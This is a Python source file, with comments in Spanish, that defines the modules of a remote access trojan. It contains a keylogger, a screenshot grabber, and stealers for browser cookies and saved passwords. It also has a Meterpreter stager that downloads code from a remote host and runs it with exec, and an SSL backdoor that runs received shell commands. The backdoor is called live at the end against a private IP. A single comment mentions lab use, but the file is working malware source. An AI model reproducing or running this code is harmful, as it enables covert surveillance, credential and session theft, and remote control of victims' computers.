#!/usr/bin/python
"""
Este archivo define los modulos a ser utilizados en el RAT.

Los modulos seran importados a partir de este archivo.

Autores.
-Fernando Castaneda
-Diego Serrano

"""

def screenshot():
    import os
    os.system("import -window root /tmp/$(date +%F_%H%M%S_%N).png")

def meterpreter(srv,pto):
	import socket,struct
	s=socket.socket(2,1)
	s.connect((srv,pto))
	l=struct.unpack('>I',s.recv(4))[0]
	d=s.recv(4096)
	while len(d)!=l:
	    d+=s.recv(4096)
	exec(d,{'s':s})

def keylogger():
	import pyxhook
	#Es necesario el archivo pyxhook.py
	log='/tmp/cap'
	def OnKeyPress(event):
		f=open(log,'a')
		f.write(event.Key)
		f.write('\n')
		if event.Ascii==96:
			f.close()
			hook.cancel()
	hook=pyxhook.HookManager()
	hook.KeyDown=OnKeyPress
	hook.HookKeyboard()
	hook.start()

def cookies():
	#Es necesario tener instalado sqlite3 en el sistema
	import sqlite3
	import sys
	import glob
	def firefox():
		#Probado con ICEWEASEL
		for ruta in glob.glob(r'/home/*/.mozilla/firefox/*/cookies.sqlite'):
			conn=sqlite3.connect(ruta)
			for cookie in conn.execute("select * from moz_cookies;"):
				print cookie
	def chrome():
		#Funciona para chrome y chromium
		for ruta in glob.glob(r'/home/*/.config/*/Default/Cookies'):
			conn=sqlite3.connect(ruta)
			for cookie in conn.execute("select * from cookies;"):
				print cookie
	chrome()
	firefox()

def passwd():
	import ffpassdecrypt
	import glob
	import os
	def firefox():
		f=file('ff-pass','a')
		s=ffpassdecrypt.main()
		#f.write(str(s))
		#f.write('\n')
	def chrome():
		for ruta in glob.glob(r'/home/*/.config/chromium/Default/Login Data'):
			os.system(str("python chrome-password-export.py -i "+ruta+" -p -o chrome-pass"))
	chrome()
	firefox()

def backdoor(cliente,pto):
	import SocketServer  
	import json  
	from OpenSSL import SSL  
	import os  
	import socket  
	import subprocess  
	import sys

	def pipe_command(arg_list, standard_input=False):  
	    pipe = subprocess.PIPE if standard_input else None
	    subp = subprocess.Popen(arg_list, shell=True, stdin=pipe, stdout=subprocess.PIPE)
	    if not standard_input:
	        return subp.communicate()[0]
	    return subp.communicate(standard_input)[0]

	class SSLThreadingTCPServer(SocketServer.ThreadingTCPServer):  
	    def __init__(self, address, handler):
	        SocketServer.ThreadingTCPServer.__init__(self, address, handler, bind_and_activate=False)
	        ctx = SSL.Context(SSL.SSLv23_METHOD)
	        ctx.use_privatekey_file('client.key')
	        ctx.use_certificate_file('client.pem')
	        self.socket = SSL.Connection(ctx, socket.socket(self.address_family, self.socket_type))
	        self.server_bind()
	        self.server_activate()
	        print "Serving:", address[0], "on port:", address[1]

	class Decoder(SocketServer.StreamRequestHandler):  
	    def setup(self):
	        self.connection = self.request
	        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
	        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

	    def handle(self):
	         while True:
	             socket1 = self.connection
	             str1 = socket1.recv(16804)
	             reply = pipe_command(str1)
	             if reply is not None:
	                 socket1.sendall(reply)

	def main():  
	    s = SSLThreadingTCPServer((cliente, pto), Decoder)
	    try:
	        s.serve_forever()
	    except KeyboardInterrupt:
	        sys.exit(0)

	main()




#def puerta():
	

#def cifrar():
	#ADVERTENCIA: Usar solo en lab :'(


#screenshot()
#meterpreter('192.168.47.134',4444)
#keylogger()
#cookies()
#passwd()
backdoor('192.168.47.144',6116)
